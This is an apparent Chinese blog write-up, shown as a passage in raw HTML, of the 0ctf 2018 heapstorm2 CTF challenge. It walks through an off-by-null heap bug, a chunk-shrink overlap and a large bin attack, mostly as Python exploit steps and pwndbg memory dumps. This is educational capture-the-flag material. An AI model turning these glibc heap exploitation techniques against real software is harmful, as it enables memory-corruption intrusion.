</span><br><span class="line"><span class="keyword">if</span>(<span class="number">-1</span> == fd)  </span><br><span class="line">&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">read(fd, (<span class="keyword">char</span> *)&amp;randNum, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));  </span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/0ctf2018/heapstorm2$ checksec heapstorm2</span><br><span class="line">[*] &apos;/home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="关闭fastbin的分配"><a href="#关闭fastbin的分配" class="headerlink" title="关闭fastbin的分配"></a>关闭fastbin的分配</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-153103.png" alt=""></p><h4 id="对存放堆指针和size的地方进行随机化"><a href="#对存放堆指针和size的地方进行随机化" class="headerlink" title="对存放堆指针和size的地方进行随机化"></a>对存放堆指针和size的地方进行随机化</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-130056.png" alt=""><br>读入随机数前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *555555554000+0x0000000000000CA6</span><br><span class="line">Breakpoint 1 at 0x8159b10f76</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2 </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Breakpoint *0x555555554000+0x0000000000000CA6</span><br><span class="line">pwndbg&gt; x /50gx 0x13370800</span><br><span class="line">0x13370800:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370810:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370820:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370830:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370840:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370850:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370860:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370870:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370880:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370890:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133708f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370900:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370910:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370920:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370930:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370940:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370950:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370960:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370970:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370980:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>读入随机数后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /50gx 0x13370800</span><br><span class="line">0x13370800:0x72cec7f9b44fb49e0x438137bc554b405e</span><br><span class="line">0x13370810:0x7a4f542a3248dba20x0000000000000000</span><br><span class="line">0x13370820:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370830:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370840:0x00000000000000000x0000000000000000</span><br><span class="line">0x13370850:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-143829.png" alt=""><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-143005.png" alt=""><br>用如图上数字1处的随机数去覆盖后面的16个的每一行的左八个字节(堆指针)。用如图上数字2处的随机数去覆盖后面的16个的每一行的右八个字节(size)。<br>用图上数字3处的随机数去覆盖数字4处。</p><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-151647.png" alt=""></p><h4 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-151306.png" alt=""></p><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><p>有off by null漏洞<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-151326.png" alt=""></p><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-151451.png" alt=""></p><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-152716.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在update的时候有一个off by null。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>之前做堆的题都不建结构体，全靠脑补…这次建一下，让反编译出来的好看一点。<br>1.添加segment<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-134354.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-134532.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-135002.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-135306.png" alt=""><br>2.建结构体<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-142635.png" alt=""><br>3.改函数参数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-143720.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-143639.png" alt=""><br>4.最后的修改结果<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-03-151748.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="shrink-the-chunk来overlap"><a href="#shrink-the-chunk来overlap" class="headerlink" title="shrink the chunk来overlap"></a>shrink the chunk来overlap</h3><p>前提：存在一个off-by-null漏洞（已满足）<br>目的：创造出overlap chunk，进而更改其他chunk中的内容<br>主要利用unsorted,small bin会unlink合并的特性来达到我们的目的。<br>1.伪造prev_size<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x18)     #0</span><br><span class="line">alloc(0x508)    #1</span><br><span class="line">alloc(0x18)     #2</span><br><span class="line">update(1, &apos;h&apos;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line"></span><br><span class="line">alloc(0x18)     #3</span><br><span class="line">alloc(0x508)    #4</span><br><span class="line">alloc(0x18)     #5</span><br><span class="line">update(4, &apos;h&apos;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line">alloc(0x18)     #6</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-04-013529.jpg" alt=""><br>2.free 1,于是下一个chunk的inuse和prev_size将被设置。<br>图示灰色的地方代表被free掉，然后触发off by null，修改1的size。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">update(0, &apos;h&apos;*(0x18-12))    #off-by-one</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-04-015946.png" alt=""><br>3.将free的1再分配出来,然后再分配一块空间到原来的1中，注意大小不能刚好使得这个chunk和2相邻，否则会把2的inuse位置1，不能在后续触发unlink。<br>然后再free 2，就能触发unlink，然后1和7，overlap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x18)     #1</span><br><span class="line">alloc(0x4d8)    #7</span><br><span class="line">free(1)</span><br><span class="line">free(2)         #backward consolidate</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-04-022306.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-04-023131.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /500gx 0x55f082807020</span><br><span class="line">0x55f082807020:0x49495f4d524f54530x0000000000000021</span><br><span class="line">0x55f082807030:0x00007f685fb20b780x00007f685fb20b78</span><br><span class="line">0x55f082807040:0x00000000000000200x00000000000004e0--&gt;7</span><br><span class="line">0x55f082807050:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807080:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807090:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828070f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807100:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807110:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807120:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807130:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807140:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807150:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807160:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807170:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807180:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807190:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828071f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807200:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807210:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807220:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807230:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807240:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807250:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807260:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807270:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807280:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807290:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828072f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807300:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807310:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807320:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807330:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807340:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807350:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807360:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807370:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807380:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807390:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828073f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807400:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807410:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807420:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807430:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807440:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807450:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807460:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807470:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807480:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807490:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f0828074f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807500:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807510:0x00000000000000000x0000000000000000</span><br><span class="line">0x55f082807520:0x00000000000000000x524f545350414549</span><br><span class="line">0x55f082807530:0x00000000000005100x0000000000000020</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-04-025208.jpg" alt=""><br>当free 2的时候，因为2是small bin的大小的缘故，所以会检测上一个chunk是否inused.<br>它会根据prev_size找到1，然后做unlink。<br>此时，unsortbin存放着这块大的chunk，所以下次malloc会用这一块先分配。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-04-030306.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757020 /* &apos; puUUU&apos; */</span><br><span class="line">pwndbg&gt; x /20gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000531</span><br><span class="line">0x555555757030:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>可以看出通过chunk shrink,实现了overlap。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(0x38)     #1</span><br><span class="line">alloc(0x4e8)    #2</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x555555757020 FASTBIN &#123;</span><br><span class="line">  prev_size = 5280856823766668371, </span><br><span class="line">  size = 65, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555757060 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1265, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x /100gx 0x555555757020</span><br><span class="line">0x555555757020:0x49495f4d524f54530x0000000000000041--&gt;1</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000--&gt;7</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x00000000000004f1--&gt;2</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>重复一遍之前的过程，再次构造overlap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(4)</span><br><span class="line">update(3, &apos;h&apos;*(0x18-12))    #off-by-one</span><br><span class="line">alloc(0x18)     #4</span><br><span class="line">alloc(0x4d8)    #8</span><br><span class="line">free(4)</span><br><span class="line">free(5)         #backward consolidate</span><br><span class="line">alloc(0x48)     #4</span><br></pre></td></tr></table></figure></p><p>然后4和8交叠。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /50gx 0x555555757570</span><br><span class="line">0x555555757570:0x49495f4d524f54530x0000000000000021</span><br><span class="line">0x555555757580:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757590:0x00000000000000000x00000000000004e1--&gt;8</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">unlink之后</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">pwndbg&gt; x /50gx 0x555555757570</span><br><span class="line">0x555555757570:0x49495f4d524f54530x0000000000000051--&gt;4</span><br><span class="line">0x555555757580:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757590:0x00000000000000000x0000000000000000--&gt;8</span><br><span class="line">0x5555557575a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575c0:0x00000000000000000x00000000000004e1</span><br><span class="line">0x5555557575d0:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x5555557575e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557575f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757600:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757610:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h3 id="利用unsorted-bin中的chunk插入到large-bin写数据，绕过对unsortbin中chunk的size大小的检查"><a href="#利用unsorted-bin中的chunk插入到large-bin写数据，绕过对unsortbin中chunk的size大小的检查" class="headerlink" title="利用unsorted bin中的chunk插入到large bin写数据，绕过对unsortbin中chunk的size大小的检查"></a>利用unsorted bin中的chunk插入到large bin写数据，绕过对unsortbin中chunk的size大小的检查</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">storage = <span class="number">0x13370000</span> + <span class="number">0x800</span></span><br><span class="line">fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment">#size</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">update(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks</span></span><br><span class="line">update(<span class="number">8</span>, p2)</span><br></pre></td></tr></table></figure><p>free 2前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555557575c0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557575c0</span><br></pre></td></tr></table></figure></p><p>free 2后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757060 —▸ 0x5555557575c0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757060 /* &apos;`puUUU&apos; */</span><br></pre></td></tr></table></figure></p><p>将2再分配出来，这时0x5555557575c0掉链，进入large bins中，再free 2，0x555555757060再次进入unsortedbin。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757060 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757060 /* &apos;`puUUU&apos; */</span><br><span class="line">pwndbg&gt; largebins </span><br><span class="line">largebins</span><br><span class="line">0x400: 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x7ffff7dd1f68</span><br><span class="line">0x440: 0x7ffff7dd1f78 (main_arena+1112) ◂— 0x7ffff7dd1f78</span><br><span class="line">0x480: 0x7ffff7dd1f88 (main_arena+1128) ◂— 0x7ffff7dd1f88</span><br><span class="line">0x4c0: 0x5555557575c0 —▸ 0x7ffff7dd1f98 (main_arena+1144) ◂— 0x5555557575c0</span><br></pre></td></tr></table></figure></p><p>然后要fake 0x555555757060的后向指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">storage = 0x13370000 + 0x800</span><br><span class="line">fake_chunk = storage - 0x20</span><br><span class="line"></span><br><span class="line">p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size</span><br><span class="line">p1 += p64(0) + p64(fake_chunk)      #bk</span><br><span class="line">update(7, p1)</span><br></pre></td></tr></table></figure></p><p>fake前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 